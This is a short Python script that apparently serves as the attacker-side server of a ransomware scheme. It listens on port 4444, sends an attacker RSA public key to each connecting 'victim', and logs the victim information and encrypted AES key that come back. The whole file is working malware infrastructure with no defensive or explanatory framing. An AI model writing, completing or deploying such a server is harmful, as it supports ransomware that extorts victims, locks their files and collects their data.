import socket
from datetime import datetime
import os

LOG_FILE = "logs.txt"
HOST = "10.151.192.27"
PORT = 4444

# Load attacker's RSA public key to send to victim
with open("attacker_public.pem", "rb") as f:
    rsa_public_key = f.read()

def start_server():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    server = socket.socket()
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"[*] Attacker server listening on {HOST}:{PORT}...")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")

        try:
            # Step 1: Send public key to victim
            client.send(rsa_public_key)

            # Step 2: Receive victim info + encrypted AES key
            data = client.recv(4096).decode()
            log_entry = f"\n=== Victim {addr} @ {datetime.now()} ===\n{data}\n"

            with open(LOG_FILE, "a") as log:
                log.write(log_entry)

            print("[*] Victim data logged.")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            client.close()

if __name__ == "__main__":
    start_server()

